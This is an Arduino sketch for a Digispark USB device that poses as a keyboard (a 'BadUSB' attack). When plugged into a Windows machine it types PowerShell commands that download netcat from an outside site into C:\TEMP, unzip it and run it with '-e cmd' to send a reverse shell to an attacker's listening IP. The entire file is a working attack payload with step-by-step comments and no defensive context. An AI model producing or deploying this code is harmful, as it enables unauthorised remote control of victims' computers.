#include "DigiKeyboard.h"

void setup() {
  // open start menu
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  // open powershell
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  // cd to C drive
  DigiKeyboard.print("cd C:\\");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  // make new folder
  DigiKeyboard.print("mkdir TEMP");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  // download netcat to the temp folder
  DigiKeyboard.print("Invoke-Webrequest -Uri https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip -Outfile C:\\TEMP\\nc.zip");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  // unzip netcat
  DigiKeyboard.print("Expand-Archive -Path C:\\TEMP\\nc.zip -DestinationPath C:\\TEMP\\nc");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  // cd to the place that netcat will be
  DigiKeyboard.print("cd C:\\TEMP\\nc\\netcat-1.11");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  // connect back to listener with netcat
  DigiKeyboard.print(".\\nc.exe {IP OF LISTENING DEVIE} 3333 -e cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}


void loop() {
}
